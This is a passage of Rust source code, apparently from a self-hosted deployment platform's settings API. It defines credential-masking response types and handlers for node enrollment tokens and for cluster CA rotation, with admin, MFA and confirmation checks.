        Self {
            enabled: m.enabled,
            store: m.store,
            scrape_interval_secs: m.scrape_interval_secs,
            retention_raw_days: m.retention_raw_days,
            retention_hourly_days: m.retention_hourly_days,
            retention_daily_years: m.retention_daily_years,
            clickhouse_url_set: m
                .clickhouse_url
                .as_ref()
                .is_some_and(|u| !u.trim().is_empty()),
        }
    }
}

/// Agent sandbox settings with masked per-provider credentials.
/// Each provider entry reports only whether a credential is saved, not
/// the encrypted blob itself. Non-sensitive fields (auth_type, default_model,
/// extra) are passed through so the UI can render provider-specific state.
#[derive(Debug, Clone, Serialize, Deserialize, ToSchema)]
pub struct AgentSandboxSettingsMasked {
    pub default_provider: String,
    pub providers: std::collections::HashMap<String, ProviderConfigMasked>,
    // Legacy top-level credential — reported only as a boolean
    pub api_key_saved: bool,
    pub auth_type: String,
    pub enabled: bool,
    pub runtime: String,
    pub custom_image: String,
    pub cpu_limit: f64,
    pub memory_limit_mb: u64,
    pub network_mode: String,
    pub sandbox_backend: String,
    /// Operator ceiling for a sandbox create request's `cpu_limit`; `null` = built-in.
    #[schema(minimum = 0.01)]
    pub max_cpu_limit: Option<f64>,
    /// Operator ceiling for `memory_limit_mb`; `null` = built-in.
    #[schema(minimum = 6)]
    pub max_memory_limit_mb: Option<u64>,
    /// Operator ceiling for `pids_limit`; `null` = built-in.
    #[schema(minimum = 1)]
    pub max_pids_limit: Option<i64>,
    /// Most live sandboxes per user; `null` = unlimited.
    #[schema(minimum = 1)]
    pub max_sandboxes_per_user: Option<u32>,
}

#[derive(Debug, Clone, Serialize, Deserialize, ToSchema)]
pub struct ProviderConfigMasked {
    pub auth_type: String,
    /// True if a credential is stored for this provider. The encrypted blob
    /// is never returned over HTTP.
    pub credential_saved: bool,
    pub default_model: Option<String>,
    pub extra: serde_json::Value,
}

/// Preview gateway settings with `shared_secret` elided.
#[derive(Debug, Clone, Serialize, Deserialize, ToSchema)]
pub struct PreviewGatewaySettingsMasked {
    pub image: String,
    pub host_port: u16,
    pub auto_upgrade: bool,
    pub shared_secret_set: bool,
}

/// Multi-node settings with `join_token_hash` elided.
#[derive(Debug, Clone, Serialize, Deserialize, ToSchema)]
pub struct MultiNodeSettingsMasked {
    pub has_join_token: bool,
    pub private_address: Option<String>,
    /// Whether control-plane↔agent mutual TLS is enforced.
    pub require_mtls: bool,
    /// Whether the deprecated shared join token is still accepted.
    pub legacy_shared_token_enabled: bool,
    /// SHA-256 fingerprint of the cluster CA certificate (public — operators can
    /// verify it out of band; the CA private key is never exposed).
    pub cluster_ca_fingerprint: Option<String>,
    /// Effective cluster-wide container address pool. `None` only when the
    /// singleton network configuration could not be read.
    pub cluster_network: Option<ClusterNetworkSettings>,
    /// Node resource-alert thresholds (percent); `None` = that alert disabled.
    pub node_cpu_alert_percent: Option<f64>,
    pub node_memory_alert_percent: Option<f64>,
    pub node_disk_alert_percent: Option<f64>,
    /// Seconds without a heartbeat before a node's workloads are failed over;
    /// `None` = automatic failover disabled.
    pub node_failover_after_secs: Option<u64>,
}

/// Read-only cluster network state. The pool is changed through
/// `PUT /settings/cluster-network` or `temps network setup-multi-node`, which
/// refuse while any allocation is in use (ADR 056). `locked` means only that
/// allocations exist: allocations never applied are re-assigned by a change,
/// so whether it is allowed now is `GET /settings/cluster-network`'s
/// `can_change`.
#[derive(Debug, Clone, Serialize, Deserialize, ToSchema, PartialEq, Eq)]
pub struct ClusterNetworkSettings {
    pub compute_pool_cidr: String,
    pub subnet_prefix_len: u8,
    pub allocation_count: u64,
    pub locked: bool,
}

/// DNS provider settings with masked sensitive fields
#[derive(Debug, Clone, Serialize, Deserialize, ToSchema)]
pub struct DnsProviderSettingsMasked {
    pub provider: String,
    pub cloudflare_api_key: Option<String>, // Will be masked as "******" if set
}

/// Docker registry settings with masked sensitive fields
#[derive(Debug, Clone, Serialize, Deserialize, ToSchema)]
pub struct DockerRegistrySettingsMasked {
    pub enabled: bool,
    pub registry_url: Option<String>,
    pub username: Option<String>,
    pub password: Option<String>, // Will be masked as "******" if set
    pub tls_verify: bool,
    pub ca_certificate: Option<String>,
}

impl From<AppSettings> for AppSettingsResponse {
    fn from(settings: AppSettings) -> Self {
        // Resolved before the literal below starts moving fields out of
        // `settings`; absence means "never configured", which reads as default.
        let self_update = settings.self_update();
        let trust_loopback_forwarded_ip = settings.trust_loopback_forwarded_ip();
        Self {
            plugin_installation_reporting_enabled: settings.plugin_installation_reporting_enabled,
            external_url: settings.external_url,
            internal_url: settings.internal_url,
            public_ingress_url: settings.public_ingress_url,
            preview_domain: settings.preview_domain,
            edge_target: settings.edge_target,
            cloudflare_new_projects: settings.cloudflare_new_projects,
            bunny_new_projects: settings.bunny_new_projects,
            console_force_https: settings.console_force_https,
            // Overridden by the handler via `with_proxy_port` — this struct
            // has no access to `ConfigService` here, only the DB-backed
            // `AppSettings` row. 8080 mirrors `ConfigService::proxy_port()`'s
            // own fallback so an un-reconciled response is never worse than
            // that.
            proxy_port: 8080,
            cloud: settings.cloud,
            screenshots: settings.screenshots,
            letsencrypt: settings.letsencrypt,
            dns_provider: DnsProviderSettingsMasked {
                provider: settings.dns_provider.provider,
                // Mask the API key if it exists
                cloudflare_api_key: settings
                    .dns_provider
                    .cloudflare_api_key
                    .map(|_| "******".to_string()),
            },
            security_headers: settings.security_headers,
            rate_limiting: settings.rate_limiting,
            trust_loopback_forwarded_ip,
            docker_registry: DockerRegistrySettingsMasked {
                enabled: settings.docker_registry.enabled,
                registry_url: settings.docker_registry.registry_url,
                username: settings.docker_registry.username,
                // Mask the password if it exists
                password: settings
                    .docker_registry
                    .password
                    .map(|_| "******".to_string()),
                tls_verify: settings.docker_registry.tls_verify,
                ca_certificate: settings.docker_registry.ca_certificate,
            },
            registry_mirror_prefix: settings.registry_mirror_prefix,
            disk_space_alert: settings.disk_space_alert,
            container_logs: settings.container_logs,
            agent_sandbox: AgentSandboxSettingsMasked {
                default_provider: settings.agent_sandbox.default_provider,
                providers: settings
                    .agent_sandbox
                    .providers
                    .into_iter()
                    .map(|(id, cfg)| {
                        (
                            id,
                            ProviderConfigMasked {
                                auth_type: cfg.auth_type,
                                credential_saved: cfg.credentials_encrypted.is_some(),
                                default_model: cfg.default_model,
                                extra: {
                                    let mut extra = cfg.extra;
                                    if let Some(object) = extra.as_object_mut() {
                                        object.remove("credential_verified");
                                    }
                                    extra
                                },
                            },
                        )
                    })
                    .collect(),
                api_key_saved: settings.agent_sandbox.api_key_encrypted.is_some(),
                auth_type: settings.agent_sandbox.auth_type,
                enabled: settings.agent_sandbox.enabled,
                runtime: settings.agent_sandbox.runtime,
                custom_image: settings.agent_sandbox.custom_image,
                cpu_limit: settings.agent_sandbox.cpu_limit,
                memory_limit_mb: settings.agent_sandbox.memory_limit_mb,
                network_mode: settings.agent_sandbox.network_mode,
                sandbox_backend: settings
                    .agent_sandbox
                    .sandbox_backend
                    .unwrap_or_else(|| "docker".to_string()),
                max_cpu_limit: settings.agent_sandbox.max_cpu_limit,
                max_memory_limit_mb: settings.agent_sandbox.max_memory_limit_mb,
                max_pids_limit: settings.agent_sandbox.max_pids_limit,
                max_sandboxes_per_user: settings.agent_sandbox.max_sandboxes_per_user,
            },
            ai_config: settings.ai_config,
            preview_gateway: PreviewGatewaySettingsMasked {
                image: settings.preview_gateway.image,
                host_port: settings.preview_gateway.host_port,
                auto_upgrade: settings.preview_gateway.auto_upgrade,
                shared_secret_set: !settings.preview_gateway.shared_secret.is_empty(),
            },
            multi_node: MultiNodeSettingsMasked {
                has_join_token: settings.multi_node.join_token_hash.is_some(),
                require_mtls: settings.multi_node.require_mtls,
                legacy_shared_token_enabled: settings.multi_node.legacy_shared_token_enabled,
                cluster_ca_fingerprint: settings
                    .multi_node
                    .cluster_ca_cert_pem
                    .as_deref()
                    .and_then(|pem| temps_core::node_pki::ca_fingerprint_sha256(pem).ok()),
                cluster_network: None,
                node_cpu_alert_percent: settings.multi_node.node_cpu_alert_percent,
                node_memory_alert_percent: settings.multi_node.node_memory_alert_percent,
                node_disk_alert_percent: settings.multi_node.node_disk_alert_percent,
                node_failover_after_secs: settings.multi_node.node_failover_after_secs,
                private_address: settings.multi_node.private_address,
            },
            // `effective_metrics_store` defaults to the configured store here;
            // the handler overrides it with the runtime-reconciled value once
            // the ClickHouse env-var state is known (via `with_effective_store`).
            effective_metrics_store: settings.monitoring.store.clone(),
            effective_observability_store: MetricsStoreKind::TimescaleDb,
            monitoring: MonitoringSettingsMasked::from(settings.monitoring),
            monitored_services_count: None,
            observability_compression: settings.observability_compression,
            observability_retention: settings.observability_retention,
            analytics_retention: settings.analytics_retention,
            clickhouse: ClickHouseSettingsResponse::from_stored(settings.clickhouse.compression),
            geo: GeoSettingsMasked::from(settings.geo),
            insecure_tls: settings.insecure_tls,
            trusted_private_networks: settings.trusted_private_networks,
            setup_complete: settings.setup_complete,
            require_mfa_for_admins: settings.require_mfa_for_admins,
            on_demand_tls: settings.on_demand_tls,
            cluster_dns: settings.cluster_dns,
            build_limits: settings.build_limits,
            ai_chat_limits: settings.ai_chat_limits,
            ai_workspace_file_limits: settings.ai_workspace_file_limits,
            request_timeouts: settings.request_timeouts,
            connection_limits: settings.connection_limits,
            tenant_resource_ceilings: settings.tenant_resource_ceilings,
            self_update,
            image_retention: settings.image_retention,
            mcp_server: settings.mcp_server,
        }
    }
}

impl AppSettingsResponse {
    fn with_cluster_network_state(mut self, state: Option<crate::ClusterNetworkState>) -> Self {
        self.multi_node.cluster_network = state.map(|state| ClusterNetworkSettings {
            compute_pool_cidr: state.compute_pool_cidr,
            subnet_prefix_len: state.subnet_prefix_len,
            allocation_count: state.allocation_count,
            locked: state.allocation_count > 0,
        });
        self
    }

    fn with_clickhouse_runtime_state(
        mut self,
        configured: bool,
        effective: ClickHouseCompression,
        health: Option<temps_clickhouse::HealthSnapshot>,
    ) -> Self {
        self.clickhouse = self
            .clickhouse
            .with_runtime_state(configured, effective, health);
        self
    }

    /// Reconcile `effective_metrics_store` with the server's ClickHouse
    /// configuration. The runtime only uses ClickHouse when both the
    /// `monitoring.store` toggle is `click_house` AND all `TEMPS_CLICKHOUSE_*`
    /// env vars are set (`clickhouse_enabled`); otherwise it falls back to
    /// TimescaleDB. This mirrors `build_ch_metrics_store` in the serve path so
    /// the UI reports the backend metrics actually land in.
    fn with_effective_store(mut self, clickhouse_enabled: bool) -> Self {
        self.effective_metrics_store =
            if self.monitoring.store == MetricsStoreKind::ClickHouse && clickhouse_enabled {
                MetricsStoreKind::ClickHouse
            } else {
                MetricsStoreKind::TimescaleDb
            };
        self.effective_observability_store = if clickhouse_enabled {
            MetricsStoreKind::ClickHouse
        } else {
            MetricsStoreKind::TimescaleDb
        };
        self
    }

    /// Sets the real proxy listener port, resolved from `ConfigService`
    /// (unavailable to the plain `From<AppSettings>` conversion above).
    fn with_proxy_port(mut self, proxy_port: u16) -> Self {
        self.proxy_port = proxy_port;
        self
    }

    fn with_effective_timescale_state(
        mut self,
        policies: EffectiveTelemetryPolicies,
        monitored_services_count: Option<u64>,
    ) -> Self {
        self.monitored_services_count = monitored_services_count;

        if self.effective_metrics_store == MetricsStoreKind::TimescaleDb {
            if let Some(days) = policies.metrics_raw_days {
                self.monitoring.retention_raw_days = days;
            }
            if let Some(days) = policies.metrics_hourly_days {
                self.monitoring.retention_hourly_days = days;
            }
            if let Some(years) = policies.metrics_daily_years {
                self.monitoring.retention_daily_years = years;
            }
        }

        if self.effective_observability_store == MetricsStoreKind::TimescaleDb {
            if let Some(hours) = policies.proxy_logs_compression_hours {
                self.observability_compression.proxy_logs_after_hours = hours;
            }
            if let Some(hours) = policies.otel_spans_compression_hours {
                self.observability_compression.otel_spans_after_hours = hours;
            }
            if let Some(days) = policies.proxy_logs_retention_days {
                self.observability_retention.proxy_logs_days = days;
            }
            if let Some(days) = policies.otel_spans_retention_days {
                self.observability_retention.otel_spans_days = days;
            }
        }

        if let Some(days) = policies.otel_logs_retention_days {
            self.observability_retention.otel_logs_days = days;
        }
        if self.effective_observability_store == MetricsStoreKind::TimescaleDb {
            if let Some(days) = policies.otel_metrics_retention_days {
                self.observability_retention.otel_metrics_days = days;
            }
        }

        self
    }
}

#[derive(OpenApi)]
#[openapi(
    paths(
        get_settings,
        get_update_status,
        get_update_capability,
        start_update,
        check_for_update,
        get_disk_status,
        get_feature_maturity,
        update_settings,
        generate_join_token,
        revoke_join_token,
        get_join_token_status,
        mint_enrollment_token,
        list_enrollment_tokens,
        revoke_enrollment_token,
        rotate_cluster_ca,
        refresh_route_table,
        get_public_ingress_status,
    ),
    components(schemas(
        AppSettings,
        AppSettingsResponse,
        crate::disk_status::DiskInfo,
        crate::disk_status::DiskSpaceAlert,
        crate::disk_status::DiskSpaceCheckResult,
        ContainerLogSettings,
        ClusterDnsSettings,
        OnDemandTlsSettings,
        CloudSettings,
        PublicHostnameStrategy,
        DnsProviderSettingsMasked,
        DockerRegistrySettingsMasked,
        AgentSandboxSettingsMasked,
        ProviderConfigMasked,
        PreviewGatewaySettingsMasked,
        MultiNodeSettingsMasked,
        MonitoringSettingsMasked,
        ObservabilityCompressionSettings,
        ObservabilityRetentionSettings,
        temps_core::AnalyticsRetentionSettings,
        ClickHouseSettingsResponse,
        ClickHouseConnectionStatus,
        ClickHouseConnectionState,
        ClickHouseFailureKind,
        ClickHouseCompression,
        temps_core::ClickHouseSettings,
        MetricsStoreKind,
        SettingsUpdateResponse,
        GenerateJoinTokenResponse,
        JoinTokenStatusResponse,
        MintEnrollmentTokenRequest,
        MintEnrollmentTokenResponse,
        EnrollmentTokenInfo,
        EnrollmentTokenListResponse,
        RotateClusterCaRequest,
        RotateClusterCaResponse,
        RouteRefreshResponse,
        PublicIngressStatusResponse,
        temps_core::public_ingress::PublicIngressSource,
        UpdateStatusResponse,
        UpdateCapabilityResponse,
        StartUpdateRequest,
        StartUpdateResponse,
        temps_core::SelfUpdateSettings,
        temps_core::SelfUpdateAttempt,
        temps_core::SelfUpdateBlocker,
        temps_core::SelfUpdatePhase,
        temps_core::SelfUpdateRestartMode,
        temps_core::SelfUpdateStatus,
        temps_core::ReleaseCheckResult,
        temps_core::SupervisorKind,
        temps_core::feature_maturity::FeatureMaturity,
        temps_core::feature_maturity::Maturity,
    )),
    info(
        title = "Settings API",
        description = "API endpoints for managing application settings. \
        Provides configuration management for system-wide settings.",
        version = "1.0.0"
    )
)]
pub struct SettingsApiDoc;

pub fn configure_routes() -> Router<Arc<SettingsState>> {
    Router::new()
        .route("/settings", get(get_settings))
        .route("/settings", put(update_settings))
        .route("/settings/update-status", get(get_update_status))
        .route(
            "/settings/update",
            get(get_update_capability).post(start_update),
        )
        .route("/settings/update/check", post(check_for_update))
        .route("/settings/disk-status", get(get_disk_status))
        .route("/v1/platform/feature-maturity", get(get_feature_maturity))
        .route("/settings/join-token/generate", post(generate_join_token))
        .route("/settings/join-token", delete(revoke_join_token))
        .route("/settings/join-token/status", get(get_join_token_status))
        .route(
            "/settings/enrollment-tokens",
            post(mint_enrollment_token).get(list_enrollment_tokens),
        )
        .route(
            "/settings/enrollment-tokens/{id}",
            delete(revoke_enrollment_token),
        )
        .route("/settings/cluster-ca/rotate", post(rotate_cluster_ca))
        .route("/settings/routes/refresh", post(refresh_route_table))
        .route("/settings/public-ingress", get(get_public_ingress_status))
}

/// Return the build-time compatibility promise for every user-facing feature.
#[utoipa::path(
    tag = "Platform",
    get,
    path = "/v1/platform/feature-maturity",
    responses(
        (status = 200, description = "Feature maturity registry for this build", body = [temps_core::feature_maturity::FeatureMaturity]),
        (status = 401, description = "Unauthorized"),
        (status = 403, description = "Insufficient permissions")
    ),
    security(("bearer_auth" = []))
)]
async fn get_feature_maturity(
    RequireAuth(auth): RequireAuth,
) -> Result<impl IntoResponse, Problem> {
    permission_guard!(auth, PlatformInfoRead);
    Ok((
        [(header::CACHE_CONTROL, "private, max-age=3600")],
        Json(temps_core::feature_maturity::FEATURE_MATURITY),
    ))
}

// ── Node enrollment tokens (ADR-020 WS-1.1) ──────────────────────────────────

#[derive(Debug, Deserialize, ToSchema)]
pub struct MintEnrollmentTokenRequest {
    /// Maximum registrations this token may authorize (default 1).
    pub max_uses: Option<i32>,
    /// Time-to-live in seconds (default 3600 = 1h).
    pub ttl_secs: Option<i64>,
    /// Optional: restrict the token to register one specific node name.
    pub bound_node_name: Option<String>,
}

#[derive(Debug, Serialize, ToSchema)]
pub struct MintEnrollmentTokenResponse {
    pub id: i32,
    /// The plaintext enrollment token — shown only once, save it now.
    pub token: String,
    pub expires_at: String,
    pub max_uses: i32,
    /// SHA-256 fingerprint of the cluster CA. Token issuance initializes the
    /// CA when needed, so every newly minted token carries a trust pin.
    pub ca_fingerprint: Option<String>,
    pub message: String,
}

#[derive(Debug, Serialize, ToSchema)]
pub struct EnrollmentTokenInfo {
    pub id: i32,
    pub expires_at: String,
    pub used_count: i32,
    pub max_uses: i32,
    pub bound_node_name: Option<String>,
    pub created_at: String,
}

#[derive(Debug, Serialize, ToSchema)]
pub struct EnrollmentTokenListResponse {
    pub tokens: Vec<EnrollmentTokenInfo>,
}

#[derive(Debug, Deserialize, ToSchema)]
pub struct RotateClusterCaRequest {
    /// Fingerprint observed through a trusted operator channel immediately
    /// before rotation. The request fails if the active root changed.
    pub expected_fingerprint: String,
    /// Destructive-action guard. Must be exactly `ROTATE CLUSTER CA`.
    pub confirmation: String,
}

#[derive(Debug, Serialize, ToSchema)]
pub struct RotateClusterCaResponse {
    pub previous_fingerprint: String,
    pub new_fingerprint: String,
    pub revoked_enrollment_tokens: u64,
    pub message: String,
}

/// Replace a compromised cluster CA and invalidate outstanding enrollment
/// tokens. Existing workers fail closed until they are re-enrolled.
#[utoipa::path(
    tag = "Settings",
    post,
    path = "/settings/cluster-ca/rotate",
    request_body = RotateClusterCaRequest,
    responses(
        (status = 200, description = "Cluster CA rotated", body = RotateClusterCaResponse),
        (status = 400, description = "Invalid confirmation or CA state"),
        (status = 401, description = "Unauthorized"),
        (status = 403, description = "Insufficient permissions"),
        (status = 409, description = "Expected fingerprint is stale"),
        (status = 428, description = "Fresh MFA verification required"),
        (status = 500, description = "Internal server error")
    ),
    security(("bearer_auth" = []))
)]
async fn rotate_cluster_ca(
    RequireAuth(auth): RequireAuth,
    State(app_state): State<Arc<SettingsState>>,
    Extension(metadata): Extension<RequestMetadata>,
    Json(req): Json<RotateClusterCaRequest>,
) -> Result<impl IntoResponse, Problem> {
    permission_guard!(auth, SettingsWrite);
    permission_guard!(auth, ClusterCaRotate);

    require_cluster_ca_rotation_authorization(
        app_state.sensitive_action_authorizer.as_ref(),
        &auth,
    )
    .await?;

    if req.confirmation != "ROTATE CLUSTER CA" {
        return Err(ErrorBuilder::new(StatusCode::BAD_REQUEST)
            .title("Confirmation Required")
            .detail("confirmation must be exactly ROTATE CLUSTER CA")
            .build());
    }

    let (replacement, result) = crate::cluster_ca::rotate_cluster_ca(
        &app_state.config_service,
        &app_state.encryption_service,
        req.expected_fingerprint.trim(),
    )
    .await
    .map_err(|error| {
        use crate::cluster_ca::ClusterCaError;
        use crate::ConfigServiceError;
        match error {
            ClusterCaError::Settings(ConfigServiceError::ClusterCaFingerprintMismatch) => {
                ErrorBuilder::new(StatusCode::CONFLICT)
                    .title("Cluster CA Changed")
                    .detail("The active cluster CA no longer matches expected_fingerprint. Read the current fingerprint through a trusted channel before retrying.")
                    .build()
            }
            ClusterCaError::Settings(ConfigServiceError::ClusterCaNotInitialized) => {
                ErrorBuilder::new(StatusCode::BAD_REQUEST)
                    .title("Cluster CA Not Initialized")
                    .detail("Mint an enrollment token to initialize the cluster CA before rotating it.")
                    .build()
            }
            ClusterCaError::Settings(ConfigServiceError::InvalidConfiguration { .. }) => {
                error!(%error, "Refused cluster CA rotation from an incomplete or invalid state");
                ErrorBuilder::new(StatusCode::BAD_REQUEST)
                    .title("Invalid Cluster CA State")
                    .detail("The active cluster CA state is incomplete or invalid. Check the server logs and restore the control-plane settings backup before retrying.")
                    .build()
            }
            error => {
                error!(%error, "Failed to rotate cluster CA");
                ErrorBuilder::new(StatusCode::INTERNAL_SERVER_ERROR)
                    .title("Cluster CA Rotation Failed")
                    .detail("The cluster CA was not rotated. Check the server logs for details.")
                    .build()
            }
        }
    })?;
    let new_fingerprint = temps_core::node_pki::ca_fingerprint_sha256(&replacement.cert_pem)
        .map_err(|error| {
            error!(%error, "Failed to fingerprint newly committed cluster CA");
            ErrorBuilder::new(StatusCode::INTERNAL_SERVER_ERROR)
                .title("Cluster CA Rotation Incomplete")
                .detail("The new CA was committed but its fingerprint response could not be generated. Read the current fingerprint from authenticated settings before re-enrolling workers.")
                .build()
        })?;

    let audit = ClusterCaRotatedAudit {
        context: AuditContext {
            user_id: auth.user_id(),
            ip_address: Some(metadata.ip_address.clone()),
            user_agent: metadata.user_agent.clone(),
        },
        previous_fingerprint: result.previous_fingerprint.clone(),
        new_fingerprint: new_fingerprint.clone(),
        revoked_enrollment_tokens: result.revoked_enrollment_tokens,
    };
    if let Err(error) = app_state.audit_service.create_audit_log(&audit).await {
        tracing::error!(%error, "Failed to record cluster CA rotation audit log");
    }

    Ok(Json(RotateClusterCaResponse {
        previous_fingerprint: result.previous_fingerprint,
        new_fingerprint,
        revoked_enrollment_tokens: result.revoked_enrollment_tokens,
        message: "Cluster CA rotated. Every worker must now be re-enrolled with a new single-use token and the new fingerprint.".to_string(),
    }))
}

async fn require_cluster_ca_rotation_authorization(
    authorizer: &dyn temps_core::SensitiveActionAuthorizer,
    auth: &temps_auth::AuthContext,
) -> Result<(), Problem> {
    if !auth.is_session() || auth.session_id().is_none() {
        return Err(ErrorBuilder::new(StatusCode::FORBIDDEN)
            .title("Persisted Browser Session Required")
            .detail("Cluster CA rotation cannot be performed with an API key, CLI token, deployment token, or non-persisted session. Sign in to the Temps console as an administrator.")
            .value("error_code", "CLUSTER_CA_ROTATION_BROWSER_SESSION_REQUIRED")
            .build());
    }

    if !auth.is_admin() {
        return Err(ErrorBuilder::new(StatusCode::FORBIDDEN)
            .title("Administrator Required")
            .detail("Only a full Temps administrator may rotate the cluster CA. Platform administrators and delegated roles are not sufficient.")
            .value("error_code", "CLUSTER_CA_ROTATION_ADMIN_REQUIRED")
            .build());
    }

    let mfa_enabled = auth.user.as_ref().is_some_and(|user| user.mfa_enabled);
    if !mfa_enabled {
        return Err(ErrorBuilder::new(StatusCode::FORBIDDEN)
            .title("MFA Enrollment Required")
            .detail(
                "Enroll an MFA method in account security settings before rotating the cluster CA.",
            )
            .value("error_code", "CLUSTER_CA_ROTATION_MFA_REQUIRED")
            .value("setup_path", "/settings/security")
            .build());
    }

    temps_auth::require_sensitive_action(
        authorizer,
        auth,
        temps_core::SensitiveAction::RotateClusterCa,
    )
    .await
}

fn enrollment_error_to_problem(e: crate::enrollment_tokens::EnrollmentError) -> Problem {
    use crate::enrollment_tokens::EnrollmentError;
    match e {
        EnrollmentError::Validation { message } => ErrorBuilder::new(StatusCode::BAD_REQUEST)
            .title("Validation Error")
            .detail(message)
            .build(),
        EnrollmentError::NotFound { id } => ErrorBuilder::new(StatusCode::NOT_FOUND)
            .title("Enrollment Token Not Found")
            .detail(format!("Enrollment token {} not found", id))
            .build(),
        EnrollmentError::InvalidToken
        | EnrollmentError::Expired
        | EnrollmentError::Revoked
        | EnrollmentError::Exhausted => ErrorBuilder::new(StatusCode::BAD_REQUEST)
            .title("Invalid Enrollment Token")
            .detail(e.to_string())
            .build(),
        EnrollmentError::Database(err) => {
            error!("Enrollment token DB error: {}", err);
            ErrorBuilder::new(StatusCode::INTERNAL_SERVER_ERROR)
                .title("Internal Server Error")
                .detail("Database error")
                .build()
        }
    }
}

/// Mint a short-lived, single-use node enrollment token.
#[utoipa::path(
    tag = "Settings",
    post,
    path = "/settings/enrollment-tokens",
    request_body = MintEnrollmentTokenRequest,
    responses(
        (status = 200, description = "Enrollment token minted", body = MintEnrollmentTokenResponse),
        (status = 401, description = "Unauthorized"),
        (status = 403, description = "Insufficient permissions"),
        (status = 500, description = "Internal server error")
    ),
    security(("bearer_auth" = []))
)]
async fn mint_enrollment_token(
    RequireAuth(auth): RequireAuth,
    State(app_state): State<Arc<SettingsState>>,
    Json(req): Json<MintEnrollmentTokenRequest>,
) -> Result<impl IntoResponse, Problem> {
    permission_guard!(auth, SettingsWrite);

    // Initialize the cluster CA before minting the token. This makes the first
    // enrollment as strongly pinned as every subsequent enrollment and avoids
    // trust-on-first-use against the registration response.
    let cluster_ca = crate::cluster_ca::ensure_cluster_ca(
        &app_state.config_service,
        &app_state.encryption_service,
    )
    .await
    .map_err(|error| {
        error!(%error, "Failed to initialize cluster CA before enrollment-token minting");
        ErrorBuilder::new(StatusCode::INTERNAL_SERVER_ERROR)
            .title("Cluster CA Initialization Failed")
            .detail("The enrollment token was not created because the cluster trust root could not be initialized. Check the server logs for details.")
            .build()
    })?;
    let ca_fingerprint = Some(
        temps_core::node_pki::ca_fingerprint_sha256(&cluster_ca.cert_pem).map_err(|error| {
            error!(%error, "Failed to fingerprint initialized cluster CA");
            ErrorBuilder::new(StatusCode::INTERNAL_SERVER_ERROR)
                .title("Cluster CA Initialization Failed")
                .detail("The enrollment token was not created because the cluster trust root could not be fingerprinted. Check the server logs for details.")
                .build()
        })?,
    );

    let params = crate::enrollment_tokens::MintParams {
        max_uses: req.max_uses.unwrap_or(1),
        ttl_secs: req.ttl_secs.unwrap_or(3600),
        bound_node_name: req
            .bound_node_name
            .map(|s| s.trim().to_string())
            .filter(|s| !s.is_empty()),
        bound_labels: None,
        created_by_user_id: Some(auth.user_id()),
        ca_fingerprint: ca_fingerprint.clone(),
    };

    let (plaintext, model) = app_state
        .enrollment_token_service
        .mint(params)
        .await
        .map_err(enrollment_error_to_problem)?;

    info!(
        user_id = auth.user_id(),
        token_id = model.id,
        "Node enrollment token minted"
    );

    Ok(Json(MintEnrollmentTokenResponse {
        id: model.id,
        token: plaintext,
        expires_at: model.expires_at.to_rfc3339(),
        max_uses: model.max_uses,
        ca_fingerprint,
        message: "Enrollment token minted. Save it now — it will not be shown again.".to_string(),
    }))
}

/// List currently-valid node enrollment tokens (hashes elided).
#[utoipa::path(
    tag = "Settings",
    get,
    path = "/settings/enrollment-tokens",
    responses(
        (status = 200, description = "Active enrollment tokens", body = EnrollmentTokenListResponse),
        (status = 401, description = "Unauthorized"),
        (status = 403, description = "Insufficient permissions"),
        (status = 500, description = "Internal server error")
    ),
    security(("bearer_auth" = []))
)]
async fn list_enrollment_tokens(
    RequireAuth(auth): RequireAuth,
    State(app_state): State<Arc<SettingsState>>,
) -> Result<impl IntoResponse, Problem> {
    permission_guard!(auth, SettingsRead);

    let tokens = app_state
        .enrollment_token_service
        .list_active()
        .await
        .map_err(enrollment_error_to_problem)?;

    let tokens = tokens
        .into_iter()
        .map(|t| EnrollmentTokenInfo {
            id: t.id,
            expires_at: t.expires_at.to_rfc3339(),
            used_count: t.used_count,
            max_uses: t.max_uses,
            bound_node_name: t.bound_node_name,
            created_at: t.created_at.to_rfc3339(),
        })
        .collect();

    Ok(Json(EnrollmentTokenListResponse { tokens }))
}

/// Revoke a node enrollment token by id.
#[utoipa::path(
    tag = "Settings",
    delete,
    path = "/settings/enrollment-tokens/{id}",
    params(("id" = i32, Path, description = "Enrollment token id")),
    responses(
        (status = 200, description = "Enrollment token revoked", body = SettingsUpdateResponse),
        (status = 401, description = "Unauthorized"),
        (status = 403, description = "Insufficient permissions"),
        (status = 404, description = "Enrollment token not found"),
        (status = 500, description = "Internal server error")
    ),
    security(("bearer_auth" = []))
)]
async fn revoke_enrollment_token(
    RequireAuth(auth): RequireAuth,
    State(app_state): State<Arc<SettingsState>>,
    axum::extract::Path(id): axum::extract::Path<i32>,
) -> Result<impl IntoResponse, Problem> {
    permission_guard!(auth, SettingsWrite);

    app_state
        .enrollment_token_service
        .revoke(id)
        .await
        .map_err(enrollment_error_to_problem)?;

    info!(
        user_id = auth.user_id(),
        token_id = id,
        "Node enrollment token revoked"
    );

    Ok(Json(SettingsUpdateResponse {
        message: format!("Enrollment token {} revoked", id),
    }))
}

/// Result of the background release-update check, driving the web console's
/// upgrade banner. All optional fields are set together iff
/// `update_available` is true.
#[derive(Debug, Serialize, ToSchema)]
pub struct UpdateStatusResponse {
    /// True when a newer release than the running binary has been published
    /// on this install's channel.
    pub update_available: bool,
    /// Version tag of the running binary, e.g. `v0.1.0-beta.45`.
    pub current_version: Option<String>,
    /// Newest published tag on this install's channel.
    pub latest_version: Option<String>,
    /// Channel the install tracks: `stable` or `beta`.
    pub channel: Option<String>,
    /// Release-notes page (GitHub release) for the newer version.
    pub release_url: Option<String>,
    /// When the check that found the update ran (ISO 8601, UTC).
    pub checked_at: Option<String>,
    /// Docs page with upgrade instructions. Always present so the UI links
    /// the same page regardless of update state.
    pub docs_url: String,
}

/// Report whether a newer temps release is available for this install.
#[utoipa::path(
    tag = "Settings",
    get,
    path = "/settings/update-status",
    responses(
        (status = 200, description = "Release update status for this install", body = UpdateStatusResponse),
        (status = 401, description = "Unauthorized"),
        (status = 403, description = "Insufficient permissions")
    ),
    security(("bearer_auth" = []))
)]
async fn get_update_status(
    RequireAuth(auth): RequireAuth,
    State(app_state): State<Arc<SettingsState>>,
) -> Result<impl IntoResponse, Problem> {
    permission_guard!(auth, SettingsRead);

    let update = app_state.update_status.as_ref().and_then(|slot| slot.get());
    let response = match update {
        Some(update) => UpdateStatusResponse {
            update_available: true,
            current_version: Some(update.current_version),
            latest_version: Some(update.latest_version),
            channel: Some(update.channel),
            release_url: Some(update.release_url),
            checked_at: Some(
                update
                    .checked_at
                    .to_rfc3339_opts(chrono::SecondsFormat::Secs, true),
            ),
            docs_url: temps_core::UPGRADE_DOCS_URL.to_string(),
        },
